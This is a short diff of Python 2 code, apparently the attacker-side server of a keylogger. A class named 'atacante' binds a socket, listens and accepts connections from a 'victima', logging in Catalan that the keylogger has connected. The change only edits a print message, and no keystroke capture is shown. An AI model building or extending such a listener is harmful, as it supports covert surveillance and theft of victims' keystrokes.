@@ -9,7 +9,7 @@ class atacante(object):
 	def main(self):
 		self.server.bind((self.host, self.port)) #Abrir conexion - Abrir servidor
 		self.server.listen(1) #Establecer cuantos equipos se pueden conectar aqui
-		print "[INFO] Esperant keylogger"
+		print "[INFO] Esperant keylogger..."
 		while True:
 			victima, direccion=self.server.accept() #Aceptamos peticion
 			print "[INFO] keylogger connectat amb {0}".format(direccion[0])
